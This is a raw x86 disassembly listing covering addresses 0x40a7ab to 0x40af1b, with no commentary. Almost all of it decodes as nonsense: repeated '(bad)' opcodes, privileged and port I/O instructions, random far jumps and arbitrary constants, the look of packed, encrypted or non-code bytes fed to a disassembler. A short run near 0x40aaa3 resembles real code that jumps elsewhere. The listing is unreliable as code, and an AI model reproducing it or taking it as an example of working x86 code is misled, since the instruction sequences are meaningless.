  40a7ab:	shl    BYTE PTR [ecx+0x7],cl
  40a7ae:	push   ss
  40a7af:	mov    ebx,0xc284cfb7
  40a7b4:	adc    ebx,DWORD PTR [ecx+0x701b2565]
  40a7ba:	sub    BYTE PTR [ebx-0x1ad70fae],ch
  40a7c0:	std    
  40a7c1:	shl    BYTE PTR [ebx+0x50],0xb6
  40a7c5:	daa    
  40a7c6:	std    
  40a7c7:	pusha  
  40a7c8:	mov    edi,0x9e7b304a
  40a7cd:	sbb    ebp,DWORD PTR [ebx+edx*2-0x26]
  40a7d1:	aad    0x7e
  40a7d3:	daa    
  40a7d4:	inc    ebx
  40a7d5:	(bad)  
  40a7d6:	aad    0x94
  40a7d8:	je     0x40a7a2
  40a7da:	cdq    
  40a7db:	dec    eax
  40a7dc:	lahf   
  40a7dd:	push   0xf5bcc8a9
  40a7e2:	sbb    esp,DWORD PTR [ecx-0x716c40e4]
  40a7e8:	fwait
  40a7e9:	cmp    bh,BYTE PTR [esi-0x23810994]
  40a7ef:	int    0x9c
  40a7f1:	add    BYTE PTR [edx+0x26c18340],al
  40a7f7:	nop
  40a7f8:	mov    eax,ds:0xc2012aae
  40a7fd:	shl    BYTE PTR [edi],cl
  40a7ff:	fs gs adc eax,0x794dac16
  40a806:	pop    ebx
  40a807:	sbb    ch,bl
  40a809:	push   ecx
  40a80a:	sub    eax,0x34ebbcc8
  40a80f:	jle    0x40a875
  40a811:	add    dl,BYTE PTR [ecx+0xe47e79c]
  40a817:	dec    edi
  40a818:	shl    BYTE PTR [esi+ebx*2-0x31],cl
  40a81c:	pop    es
  40a81d:	cli    
  40a81e:	jnp    0x40a7dc
  40a820:	push   esp
  40a821:	xor    DWORD PTR [edx],esi
  40a823:	fdivr  QWORD PTR [ecx+0x5b59d1dc]
  40a829:	mov    bh,0xe9
  40a82b:	jo     0x40a7d4
  40a82d:	leave  
  40a82e:	add    BYTE PTR [ebp+edi*2-0x2de4a71b],dl
  40a835:	push   cs
  40a836:	mov    al,dl
  40a838:	arpl   WORD PTR [ecx],si
  40a83a:	adc    bl,BYTE PTR [edi]
  40a83c:	ss mov dh,0x3
  40a83f:	xor    DWORD PTR [ebx],ecx
  40a841:	shl    BYTE PTR [ecx+0x2d],1
  40a844:	inc    ecx
  40a845:	sbb    eax,0x36c1c56a
  40a84a:	retf   
  40a84b:	sub    DWORD PTR [ecx+0x65e0381d],edx
  40a851:	or     al,0xf7
  40a853:	(bad)  
  40a854:	pop    ebp
  40a855:	jne    0x40a8b1
  40a857:	push   0x52
  40a859:	or     BYTE PTR [esp+0x4c8506a9],bl
  40a860:	icebp  
  40a861:	fs jmp 0x40a82a
  40a864:	xchg   esi,eax
  40a865:	mov    es,WORD PTR [ecx-0x46aab7f9]
  40a86b:	xchg   BYTE PTR [edx],dh
  40a86d:	gs xchg edx,eax
  40a86f:	mov    gs,esi
  40a871:	cmp    al,ah
  40a873:	in     eax,0x5d
  40a875:	imul   edi,DWORD PTR [edi],0x1a
  40a878:	and    BYTE PTR [eax],dl
  40a87a:	jae    0x40a80d
  40a87c:	xchg   BYTE PTR [edi+0x3f7c21],cl
  40a882:	pop    ebp
  40a883:	cli    
  40a884:	in     al,dx
  40a885:	fchs   
  40a887:	iret   
  40a888:	int    0x63
  40a88a:	and    BYTE PTR [edx],bl
  40a88c:	in     al,dx
  40a88d:	push   cs
  40a88e:	sbb    al,0x7c
  40a890:	xchg   ebx,eax
  40a891:	jae    0x40a813
  40a893:	mov    dh,0xff
  40a895:	pop    edx
  40a896:	mov    cl,0xae
  40a898:	lds    ecx,FWORD PTR [ecx]
  40a89a:	dec    esp
  40a89b:	rol    DWORD PTR ds:0x35b738b6,0xa8
  40a8a2:	mov    esp,0x3265015f
  40a8a7:	dec    ebx
  40a8a8:	pop    ebp
  40a8a9:	inc    ecx
  40a8aa:	or     BYTE PTR [edi],dl
  40a8ac:	cmc    
  40a8ad:	mov    WORD PTR [esi-0x2e],?
  40a8b0:	dec    edx
  40a8b1:	cdq    
  40a8b2:	xor    ah,BYTE PTR [edx]
  40a8b4:	not    DWORD PTR [esi+0x1233e0]
  40a8ba:	mov    ch,0x2b
  40a8bc:	out    0x36,al
  40a8be:	test   BYTE PTR [ebp+0x1ce7c781],ah
  40a8c4:	enter  0xcb08,0x5
  40a8c8:	sub    al,0x4a
  40a8ca:	pop    ds
  40a8cb:	mov    eax,ds:0x45ec9f16
  40a8d0:	cmc    
  40a8d1:	lods   eax,DWORD PTR ds:[esi]
  40a8d2:	es push cs
  40a8d4:	test   eax,0x87c7f311
  40a8d9:	xchg   BYTE PTR [esi+0x68fdeacd],bl
  40a8df:	cmp    edi,esp
  40a8e1:	mov    bl,0xfd
  40a8e3:	rcl    BYTE PTR [eax-0x12],0x3e
  40a8e7:	imul   BYTE PTR [ebp-0x1d]
  40a8ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8eb:	out    0xa3,al
  40a8ed:	cmp    al,0x1b
  40a8ef:	stc    
  40a8f0:	push   edx
  40a8f1:	cmp    BYTE PTR [esi],ah
  40a8f3:	cli    
  40a8f4:	sbb    ebx,DWORD PTR [edi-0x1cd265c2]
  40a8fa:	pop    edx
  40a8fb:	stos   DWORD PTR es:[edi],eax
  40a8fc:	push   edx
  40a8fd:	xor    eax,0xddd80ed7
  40a902:	icebp  
  40a903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a904:	xchg   edi,eax
  40a905:	retf   0xcf3c
  40a908:	aas    
  40a909:	popf   
  40a90a:	cdq    
  40a90b:	lods   al,BYTE PTR ds:[esi]
  40a90c:	std    
  40a90d:	ror    edx,cl
  40a90f:	mov    bl,0x8d
  40a911:	dec    esp
  40a912:	out    0x33,al
  40a914:	daa    
  40a915:	add    ah,ch
  40a917:	push   esp
  40a918:	sbb    cl,BYTE PTR [eax+0x64]
  40a91b:	aas    
  40a91c:	sub    BYTE PTR [ebx+esi*4-0xbd851cd],cl
  40a923:	jmp    0x39e6cabc
  40a928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a929:	enter  0xe241,0xeb
  40a92d:	xchg   esi,eax
  40a92e:	shl    BYTE PTR [esi+0x74],0x3d
  40a932:	(bad)  
  40a933:	sub    dh,BYTE PTR [ecx+0x56]
  40a936:	mov    ebp,0x9f45da4a
  40a93b:	jmp    0x40a916
  40a93d:	or     eax,0x80b15514
  40a942:	push   eax
  40a943:	and    eax,0x9299dc52
  40a948:	sbb    BYTE PTR [edi+ecx*2+0x3d],dl
  40a94c:	add    al,0x9
  40a94e:	stos   BYTE PTR es:[edi],al
  40a94f:	pusha  
  40a950:	(bad)  
  40a951:	jg     0x40a96d
  40a953:	addr16 inc esp
  40a955:	xchg   BYTE PTR [esp+edi*8+0x48c6c77c],bl
  40a95c:	sbb    eax,0x2b77dc9a
  40a961:	xchg   ebp,eax
  40a962:	push   esi
  40a963:	sbb    dl,ah
  40a965:	aas    
  40a966:	jb     0x40a9c0
  40a968:	gs dec eax
  40a96a:	inc    eax
  40a96b:	and    al,0x3f
  40a96d:	pop    ecx
  40a96e:	mov    eax,0x58912e0
  40a973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a974:	mov    WORD PTR [ebx+0x48],cs
  40a977:	inc    BYTE PTR [ebx]
  40a979:	push   cs
  40a97a:	shl    BYTE PTR [esi+0x3a],1
  40a97d:	xchg   edi,eax
  40a97e:	std    
  40a97f:	retf   
  40a980:	test   DWORD PTR [edx-0x7e791af6],0x24c13f22
  40a98a:	dec    ecx
  40a98b:	mov    bh,0x52
  40a98d:	push   ebp
  40a98e:	js     0x40a98c
  40a990:	inc    ebp
  40a991:	cmp    eax,ebx
  40a993:	rcr    bh,1
  40a995:	adc    al,0x89
  40a997:	sbb    edi,esi
  40a999:	fsub   QWORD PTR [ecx]
  40a99b:	inc    edx
  40a99c:	dec    ecx
  40a99d:	rcr    ebx,1
  40a99f:	retf   
  40a9a0:	or     dl,ah
  40a9a2:	sub    BYTE PTR [edx],bl
  40a9a4:	inc    eax
  40a9a5:	and    DWORD PTR [eax-0x3d260cab],0x40
  40a9ac:	fdiv   st,st(3)
  40a9ae:	les    eax,FWORD PTR [eax+eax*1]
  40a9b1:	dec    edx
  40a9b2:	ror    BYTE PTR [edx-0x2cfc24bc],0x41
  40a9b9:	mov    ecx,0x51ea1bac
  40a9be:	lds    esi,FWORD PTR [ebp-0x69d62e4b]
  40a9c4:	inc    ecx
  40a9c5:	xchg   edi,eax
  40a9c6:	xor    DWORD PTR [ebp+0x6912ee86],edi
  40a9cc:	push   cs
  40a9cd:	adc    DWORD PTR [esi+0x1c56584b],esp
  40a9d3:	call   0x8941:0x2aea90e4
  40a9da:	fiadd  WORD PTR [edx]
  40a9dc:	push   es
  40a9dd:	jmp    0x40a9e7
  40a9df:	cli    
  40a9e0:	lahf   
  40a9e1:	or     DWORD PTR [ecx+0x62],0x8c4b2207
  40a9e8:	cmp    edi,DWORD PTR [edx]
  40a9ea:	sbb    eax,eax
  40a9ec:	lahf   
  40a9ed:	mov    esi,0xfa43f990
  40a9f2:	and    eax,esi
  40a9f4:	xor    ebx,edx
  40a9f6:	jo     0x40aa60
  40a9f8:	push   edi
  40a9f9:	outs   dx,DWORD PTR ds:[esi]
  40a9fa:	pop    esi
  40a9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9fc:	cld    
  40a9fd:	das    
  40a9fe:	sbb    al,0xe3
  40aa00:	inc    edi
  40aa01:	or     eax,esp
  40aa03:	cmp    BYTE PTR [ebp+0x4d48de44],ah
  40aa09:	lea    ebx,[ecx]
  40aa0b:	mov    ah,0x87
  40aa0d:	fistp  WORD PTR [edx]
  40aa0f:	jle    0x40aa3a
  40aa11:	inc    ecx
  40aa12:	xor    al,0xec
  40aa14:	jns    0x40a9a4
  40aa16:	mov    BYTE PTR [ecx],bh
  40aa18:	push   0xfffffffe
  40aa1a:	test   eax,0xdaf0ae2d
  40aa1f:	xor    eax,0xd0dc1ad9
  40aa24:	sub    al,0x12
  40aa26:	cmp    BYTE PTR [esi+edx*8],dh
  40aa29:	into   
  40aa2a:	ret    
  40aa2b:	inc    edx
  40aa2c:	test   eax,0x3494f6e3
  40aa31:	ins    DWORD PTR es:[edi],dx
  40aa32:	xchg   edx,eax
  40aa33:	bnd jb 0x40aa87
  40aa36:	mov    ah,0xef
  40aa38:	sbb    esp,DWORD PTR [eax]
  40aa3a:	xchg   esp,eax
  40aa3b:	mov    ss,WORD PTR [edi-0x4bc15511]
  40aa41:	outs   dx,DWORD PTR ds:[esi]
  40aa42:	(bad)  
  40aa44:	jns    0x40a9ca
  40aa46:	push   esi
  40aa47:	inc    edi
  40aa48:	call   0x3ec2:0x4a8397c5
  40aa4f:	sbb    ebx,DWORD PTR [eax-0x2]
  40aa52:	loop   0x40a9f1
  40aa54:	xchg   ebx,eax
  40aa55:	imul   ebp,DWORD PTR [esi-0x7f],0xb346757d
  40aa5c:	or     al,0xfa
  40aa5e:	mov    esp,0x4819a803
  40aa63:	inc    ecx
  40aa64:	cmp    eax,0x12d304a7
  40aa69:	jnp    0x40aa00
  40aa6b:	jg     0x40aa2a
  40aa6d:	push   esp
  40aa6e:	jecxz  0x40aa8c
  40aa70:	pop    edx
  40aa71:	jecxz  0x40aa3a
  40aa73:	inc    ebp
  40aa74:	sbb    al,0x83
  40aa76:	xor    dh,BYTE PTR [edx-0x5e2db565]
  40aa7c:	scas   eax,DWORD PTR es:[edi]
  40aa7d:	ja     0x40aad7
  40aa7f:	jg     0x40aa29
  40aa81:	cs push 0xffffffc3
  40aa84:	(bad)  
  40aa85:	aam    0xcb
  40aa87:	cmp    esp,esi
  40aa89:	aam    0x89
  40aa8b:	imul   ebx,DWORD PTR [edx],0x3384da70
  40aa91:	sar    DWORD PTR [edx+0x3272db],0x3
  40aa98:	ret    0x4589
  40aa9b:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xcc30d8bc
  40aacc:	lea    edx,[esp+esi*8+0x62]
  40aad0:	bound  edx,QWORD PTR [eax]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x50]
  40aad6:	and    BYTE PTR [edx+0xa8fda0a],cl
  40aadc:	sbb    eax,0xe4df9ba6
  40aae1:	push   edi
  40aae2:	push   edi
  40aae3:	push   edx
  40aae4:	pop    es
  40aae5:	lds    ebp,FWORD PTR [eax-0x4e5e55db]
  40aaeb:	(bad)  
  40aaec:	pop    edx
  40aaed:	ja     0x40ab2c
  40aaef:	cmp    eax,0xdae05468
  40aaf4:	pop    esp
  40aaf5:	add    ebp,ebx
  40aaf7:	jbe    0x40aac4
  40aaf9:	cmp    BYTE PTR [esi+0x3e80e07b],ch
  40aaff:	or     DWORD PTR es:[ebp-0x71bf6d4a],edi
  40ab06:	xor    BYTE PTR [edx+0x5ee0511],0x69
  40ab0d:	sti    
  40ab0e:	jne    0x40aab8
  40ab10:	retf   
  40ab11:	mov    BYTE PTR [edi],bl
  40ab13:	outs   dx,DWORD PTR ds:[esi]
  40ab14:	adc    al,0x49
  40ab16:	push   ebp
  40ab17:	int    0xb5
  40ab19:	inc    ecx
  40ab1a:	push   ds
  40ab1b:	pop    ds
  40ab1c:	inc    ebx
  40ab1d:	or     BYTE PTR [ebx],cl
  40ab1f:	test   DWORD PTR [ecx-0x6e166cbd],eax
  40ab25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab26:	inc    esi
  40ab27:	adc    dh,al
  40ab29:	xor    ebx,DWORD PTR [ecx+0xa41d5a2]
  40ab2f:	cmp    BYTE PTR [edi],bh
  40ab31:	ret    0x3516
  40ab34:	popf   
  40ab35:	into   
  40ab36:	fcomp  DWORD PTR [ecx+ebx*1]
  40ab39:	lds    edx,FWORD PTR [ebp-0x75]
  40ab3c:	mov    ds:0x729d8dbf,al
  40ab41:	lahf   
  40ab42:	stc    
  40ab43:	xor    BYTE PTR [eax],bl
  40ab45:	cmp    edx,DWORD PTR [ecx]
  40ab47:	cmp    al,0xb6
  40ab49:	jns    0x40ab4b
  40ab4b:	and    ebx,DWORD PTR [eax-0xb]
  40ab4e:	dec    edi
  40ab4f:	push   0xc8c7b826
  40ab54:	sub    esp,DWORD PTR [edx]
  40ab56:	repz bound ebx,QWORD PTR [eax+edx*4+0x3d7c1b14]
  40ab5e:	stos   DWORD PTR es:[edi],eax
  40ab5f:	fld    DWORD PTR [edi]
  40ab61:	mov    dl,0xab
  40ab63:	clc    
  40ab64:	push   0x67
  40ab66:	add    eax,0x3712d2cf
  40ab6b:	pop    esp
  40ab6c:	fabs   
  40ab6e:	cmp    BYTE PTR [esi+eax*1],cl
  40ab71:	adc    eax,0xc0945894
  40ab76:	sbb    eax,0x67cf9dce
  40ab7b:	test   al,0xfc
  40ab7d:	jns    0x40abbd
  40ab7f:	push   ds
  40ab80:	stos   DWORD PTR es:[edi],eax
  40ab81:	and    al,BYTE PTR [eax+0x5f8a6cba]
  40ab87:	xor    DWORD PTR [edi],edi
  40ab89:	fistp  DWORD PTR [ebx]
  40ab8b:	cmp    DWORD PTR [ebp+0x7d],ebp
  40ab8e:	add    eax,0x22fc88c9
  40ab93:	iret   
  40ab94:	sub    eax,0x2995bc42
  40ab99:	scas   al,BYTE PTR es:[edi]
  40ab9a:	xor    ebp,esp
  40ab9c:	dec    eax
  40ab9d:	inc    ecx
  40ab9e:	jae    0x40ab6f
  40aba0:	mov    ?,esp
  40aba2:	into   
  40aba3:	adc    DWORD PTR [eax],ebx
  40aba5:	and    ebx,DWORD PTR [eax-0x11f6280a]
  40abab:	cmp    ah,0xbd
  40abae:	and    al,0xd5
  40abb0:	icebp  
  40abb1:	mov    ebx,0xb2821f6f
  40abb6:	mov    bl,0x41
  40abb8:	adc    al,BYTE PTR [edx-0x2e8f0ae6]
  40abbe:	and    BYTE PTR [edx-0x52],al
  40abc1:	xchg   ecx,eax
  40abc2:	outs   dx,DWORD PTR ds:[esi]
  40abc3:	xor    al,BYTE PTR [eax+eax*8+0x52ecd410]
  40abca:	and    eax,0xc4ad2166
  40abcf:	mov    esi,0xf2a2ff50
  40abd4:	push   edx
  40abd5:	jo     0x40ab84
  40abd7:	mov    eax,0x66c07ac
  40abdc:	cwde   
  40abdd:	loopne 0x40ab9c
  40abdf:	(bad)  
  40abe0:	mov    ds:0x7f093790,eax
  40abe5:	fst    QWORD PTR [esi-0x17]
  40abe8:	sbb    BYTE PTR [edx],cl
  40abea:	ds jg  0x40abf9
  40abed:	dec    esi
  40abee:	das    
  40abef:	div    DWORD PTR [ebp+ecx*4+0x17]
  40abf3:	(bad)  
  40abf4:	push   ds
  40abf5:	and    al,0xe6
  40abf7:	(bad)  
  40abf8:	ins    DWORD PTR es:[edi],dx
  40abf9:	shr    BYTE PTR [edx+eax*2+0x3bec862e],cl
  40ac00:	aam    0xca
  40ac02:	sub    bl,ah
  40ac04:	inc    edi
  40ac05:	inc    esi
  40ac06:	ret    
  40ac07:	mov    edi,0x91dde52c
  40ac0c:	mov    BYTE PTR ds:0xc35164ae,bh
  40ac12:	jmp    0x40ac74
  40ac14:	push   ebx
  40ac15:	cmp    ah,bl
  40ac17:	inc    ecx
  40ac18:	fs jns 0x40aba6
  40ac1b:	cdq    
  40ac1c:	cmp    DWORD PTR ds:0x3fb3faa7,edx
  40ac22:	sbb    al,0x7f
  40ac24:	xlat   BYTE PTR ds:[ebx]
  40ac25:	sub    ecx,DWORD PTR [ebx+0x56f4766f]
  40ac2b:	loop   0x40ac88
  40ac2d:	cdq    
  40ac2e:	shl    DWORD PTR [ebx+0x58],cl
  40ac31:	pop    ebx
  40ac32:	js     0x40aca9
  40ac34:	lea    eax,[eax+0x1a]
  40ac37:	mov    al,0xe4
  40ac39:	sti    
  40ac3a:	push   esp
  40ac3b:	mov    ds:0xe82eb318,al
  40ac40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac41:	adc    ecx,esi
  40ac43:	in     eax,0x43
  40ac45:	int3   
  40ac46:	xchg   ecx,eax
  40ac47:	shl    DWORD PTR [ebx+0x21],0x4
  40ac4b:	dec    esi
  40ac4c:	fwait
  40ac4d:	and    bl,dh
  40ac4f:	nop
  40ac50:	ss ins BYTE PTR es:[edi],dx
  40ac52:	mov    ah,0xf0
  40ac54:	scas   eax,DWORD PTR es:[edi]
  40ac55:	add    BYTE PTR [ebp-0x68],0xaa
  40ac59:	or     eax,0x2a0fe54c
  40ac5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac5f:	dec    esi
  40ac60:	jno    0x40ac6d
  40ac62:	jmp    0x752:0x143844f8
  40ac69:	inc    ebp
  40ac6a:	mov    ebp,0x845c9274
  40ac6f:	push   0x2dc96809
  40ac74:	hlt    
  40ac75:	fcmovne st,st(7)
  40ac77:	cmp    bl,al
  40ac79:	mov    BYTE PTR [esi-0x7b65a987],bl
  40ac7f:	loope  0x40accb
  40ac81:	fnstcw WORD PTR [edi-0x8d8cfda]
  40ac87:	xchg   ebp,eax
  40ac88:	mov    eax,ds:0xa29a9e9e
  40ac8d:	clc    
  40ac8e:	test   DWORD PTR [edx+0x67],edx
  40ac91:	nop
  40ac92:	ja     0x40ad03
  40ac94:	jmp    0xe084:0x478726d3
  40ac9b:	sbb    DWORD PTR [ecx+0x74b9b84e],esp
  40aca1:	pop    edi
  40aca2:	xlat   BYTE PTR ds:[ebx]
  40aca3:	shr    DWORD PTR [ebp-0x57a6c068],0xc2
  40acaa:	je     0x40ac68
  40acac:	or     dh,cl
  40acae:	sbb    esp,DWORD PTR [ebx-0xfd6124]
  40acb4:	and    DWORD PTR [eax],edi
  40acb6:	out    0x4a,eax
  40acb8:	inc    ebx
  40acb9:	pop    edx
  40acba:	je     0x40ac3f
  40acbc:	je     0x40ac67
  40acbe:	out    0xb3,eax
  40acc0:	mov    edi,0x9bcf2ac
  40acc5:	cmp    al,0x89
  40acc7:	fsubr  st(0),st
  40acc9:	cmp    eax,0xe6ebc4c3
  40acce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40accf:	jecxz  0x40acbf
  40acd1:	dec    edx
  40acd2:	mov    al,ds:0xfcb92ca2
  40acd7:	repnz inc esp
  40acd9:	inc    ebx
  40acda:	inc    ebp
  40acdb:	push   ebx
  40acdc:	xchg   BYTE PTR [ebx+eax*1-0x42],bl
  40ace0:	push   cs
  40ace1:	jnp    0x40ac92
  40ace3:	fwait
  40ace4:	inc    DWORD PTR [ebp+0x3b]
  40ace7:	aad    0xf3
  40ace9:	pop    edx
  40acea:	and    bh,BYTE PTR [ebx-0x3136e94b]
  40acf0:	mov    ecx,0xbd4e5f6a
  40acf5:	bound  esi,QWORD PTR [ebp-0x14]
  40acf8:	sbb    DWORD PTR [eax-0x6d],0xffffffbf
  40acfc:	or     bl,BYTE PTR [esi+0x2954d97]
  40ad02:	scas   eax,DWORD PTR es:[edi]
  40ad03:	pusha  
  40ad04:	pushf  
  40ad05:	sbb    al,0x9c
  40ad07:	push   es
  40ad08:	mov    ch,0xdd
  40ad0a:	lods   al,BYTE PTR ds:[esi]
  40ad0b:	adc    DWORD PTR [ecx-0x73],0xa182adb
  40ad12:	scas   eax,DWORD PTR es:[edi]
  40ad13:	icebp  
  40ad14:	retf   
  40ad15:	js     0x40acb0
  40ad17:	mov    ds:0xe2be4405,al
  40ad1c:	sar    dl,cl
  40ad1e:	sub    BYTE PTR [ebx+0xe1541cf],al
  40ad24:	xchg   esi,eax
  40ad25:	inc    ecx
  40ad26:	or     eax,0xc9831d99
  40ad2b:	scas   eax,DWORD PTR es:[edi]
  40ad2c:	xor    BYTE PTR [edx+0x5e126306],dh
  40ad32:	cwde   
  40ad33:	xor    eax,0x54bbedd4
  40ad38:	lahf   
  40ad39:	pop    ds
  40ad3a:	fild   WORD PTR [ecx]
  40ad3c:	aaa    
  40ad3d:	and    eax,0x271e0822
  40ad43:	pop    esi
  40ad44:	(bad)  
  40ad45:	cmp    al,0xac
  40ad47:	in     al,dx
  40ad48:	mov    DWORD PTR cs:[eax-0x45],0x39382c61
  40ad50:	clc    
  40ad51:	sub    BYTE PTR [eax+0x670d241a],cl
  40ad57:	in     eax,0xb3
  40ad59:	fwait
  40ad5a:	loope  0x40ad10
  40ad5c:	xor    al,0x56
  40ad5e:	sbb    ah,dl
  40ad60:	xchg   ecx,eax
  40ad62:	push   ecx
  40ad63:	ds inc ebx
  40ad65:	xchg   esi,eax
  40ad66:	sbb    eax,0xe23499d9
  40ad6b:	stc    
  40ad6c:	out    dx,al
  40ad6d:	shld   esp,edi,cl
  40ad70:	jle    0x40ad7e
  40ad72:	cmp    DWORD PTR [ecx-0x31c1aa97],0x6d967e18
  40ad7c:	push   0xf703be42
  40ad81:	inc    ecx
  40ad82:	xchg   esp,edx
  40ad84:	arpl   WORD PTR [ebp-0x54],bp
  40ad87:	hlt    
  40ad88:	ror    dl,0xff
  40ad8b:	sbb    BYTE PTR [edx-0x4d],dh
  40ad8e:	retf   
  40ad8f:	or     esp,DWORD PTR [esi+ecx*4+0x28489217]
  40ad96:	inc    DWORD PTR [edi-0x7a03877e]
  40ad9c:	es std 
  40ad9e:	repz xchg edx,eax
  40ada0:	jbe    0x40adac
  40ada2:	mov    dh,0xb9
  40ada4:	push   ss
  40ada5:	test   eax,0x43c10523
  40adaa:	push   es
  40adab:	xor    al,0xce
  40adad:	in     al,dx
  40adae:	(bad)  
  40adaf:	pop    edx
  40adb0:	xor    DWORD PTR [ebx+0x707533e3],ebp
  40adb6:	push   cs
  40adb7:	dec    eax
  40adb8:	aam    0x9a
  40adba:	sub    al,0xae
  40adbc:	push   0xffffffde
  40adbe:	ret    
  40adbf:	or     DWORD PTR [ebx+ecx*1],edx
  40adc2:	xor    bl,bl
  40adc4:	mov    ecx,0xc6c07256
  40adc9:	test   DWORD PTR [ebp-0x53],0x78862764
  40add0:	int3   
  40add1:	fbld   TBYTE PTR [esi]
  40add3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add4:	cmc    
  40add5:	shl    BYTE PTR [esi+0x4387e46b],1
  40addb:	mov    dl,0x59
  40addd:	aas    
  40adde:	add    DWORD PTR [ecx],ebx
  40ade0:	loop   0x40ad92
  40ade2:	out    0x5b,eax
  40ade4:	loop   0x40ae14
  40ade6:	jmp    0x3af67d0d
  40adeb:	adc    DWORD PTR [ebx],ebx
  40aded:	loopne 0x40ae3e
  40adef:	xor    eax,0xaf4a119d
  40adf4:	bound  eax,QWORD PTR [ebx+0xedb90ba]
  40adfa:	imul   esi,esp,0x6fcd24d1
  40ae00:	int    0xb2
  40ae02:	dec    edi
  40ae03:	pop    ebx
  40ae04:	pop    ebp
  40ae05:	jge    0x40adfc
  40ae07:	mov    al,0xb5
  40ae09:	(bad)  
  40ae0a:	xlat   BYTE PTR ds:[ebx]
  40ae0b:	pop    edx
  40ae0c:	(bad)  
  40ae0e:	cmc    
  40ae0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae10:	add    al,0x77
  40ae12:	out    0xbf,eax
  40ae14:	and    al,BYTE PTR [eax-0x60f1fb1]
  40ae1a:	test   BYTE PTR [eax-0x21],ah
  40ae1d:	jmp    FWORD PTR [edx+0x1c]
  40ae20:	cmp    al,0xb2
  40ae22:	call   0x6c9f:0xa7271d69
  40ae29:	xchg   DWORD PTR [eax],ebp
  40ae2b:	(bad)  
  40ae2c:	mov    edi,0x67aa762a
  40ae31:	push   cs
  40ae32:	jns    0x40ade8
  40ae34:	mov    al,0xd2
  40ae36:	cld    
  40ae37:	shl    DWORD PTR [ebx],cl
  40ae39:	and    DWORD PTR cs:[edi+0x27ac495],ecx
  40ae40:	inc    edi
  40ae41:	shl    DWORD PTR [ecx],1
  40ae43:	inc    esp
  40ae44:	stos   DWORD PTR es:[edi],eax
  40ae45:	(bad)  
  40ae46:	cmc    
  40ae47:	mov    ds:0x97cf2649,al
  40ae4c:	mov    al,ds:0xa58aabe
  40ae51:	addr16 inc ebp
  40ae53:	and    DWORD PTR ds:0xd9d933bb,0xdcfd8629
  40ae5d:	add    al,0x59
  40ae5f:	push   ebx
  40ae60:	mov    esi,0x118e1977
  40ae65:	arpl   WORD PTR [eax-0x25],dx
  40ae68:	or     al,0xbb
  40ae6a:	das    
  40ae6b:	imul   DWORD PTR [eax-0x2b122592]
  40ae71:	add    al,0x41
  40ae73:	mov    ebp,0xc4699da1
  40ae78:	(bad)  
  40ae79:	jp     0x40ae26
  40ae7b:	or     eax,0x1b10d0c6
  40ae80:	cmp    ecx,DWORD PTR [ecx+0x62]
  40ae83:	aam    0xd
  40ae85:	fiadd  WORD PTR [edx-0x77a86799]
  40ae8b:	test   al,0x32
  40ae8d:	adc    ch,BYTE PTR [edx+0x6c7a796c]
  40ae93:	stos   BYTE PTR es:[edi],al
  40ae94:	fs (bad) 
  40ae96:	xor    al,0x8f
  40ae98:	test   BYTE PTR [ebp+0x2f],cl
  40ae9b:	xor    DWORD PTR [edx],edx
  40ae9d:	sub    al,0xe3
  40ae9f:	mov    ds:0x47bb7f24,al
  40aea4:	cmp    ah,BYTE PTR [ebp-0x2f]
  40aea7:	fst    st(7)
  40aea9:	or     bl,0x9d
  40aeac:	jae    0x40aef9
  40aeae:	jl     0x40af09
  40aeb0:	add    ebx,edx
  40aeb2:	mov    edx,?
  40aeb4:	repnz jecxz 0x40af0f
  40aeb7:	mov    bh,0x8b
  40aeb9:	sbb    esi,esi
  40aebb:	pusha  
  40aebc:	push   es
  40aebd:	inc    ecx
  40aebe:	push   ds
  40aebf:	add    al,0xdb
  40aec1:	mov    esi,0x658e4c78
  40aec6:	dec    ecx
  40aec7:	push   ebx
  40aec8:	ins    DWORD PTR es:[edi],dx
  40aec9:	jle    0x40ae9f
  40aecb:	out    dx,eax
  40aecc:	lods   eax,DWORD PTR ds:[esi]
  40aecd:	mov    ah,0x11
  40aecf:	mov    eax,0xf7899fcd
  40aed4:	mov    edi,0x3d0cdb9d
  40aed9:	pop    ecx
  40aeda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aedb:	bound  esi,QWORD PTR [eax-0x1a]
  40aede:	adc    BYTE PTR [edi+0x67],ah
  40aee1:	je     0x40aea8
  40aee3:	sub    cl,bh
  40aee5:	mov    eax,0x8051b66d
  40aeea:	dec    edi
  40aeeb:	loope  0x40af25
  40aeed:	inc    edx
  40aeee:	fs scas al,BYTE PTR es:[edi]
  40aef0:	pop    esi
  40aef1:	(bad)  
  40aef2:	jnp    0x40aea1
  40aef4:	and    DWORD PTR [esi+0x36],ebp
  40aef7:	js     0x40aed5
  40aef9:	call   0x105cf54b
  40aefe:	adc    ebx,DWORD PTR [ebp+0xd7efa87]
  40af04:	pop    ebp
  40af05:	fild   QWORD PTR [eax-0x6fde9ac3]
  40af0b:	cs es loop 0x40aee6
  40af0f:	xchg   edx,eax
  40af10:	adc    ebx,DWORD PTR [edx]
  40af12:	cli    
  40af13:	icebp  
  40af14:	and    bh,BYTE PTR cs:[ecx+0x2ecd9750]
  40af1b:	ret    0xd012
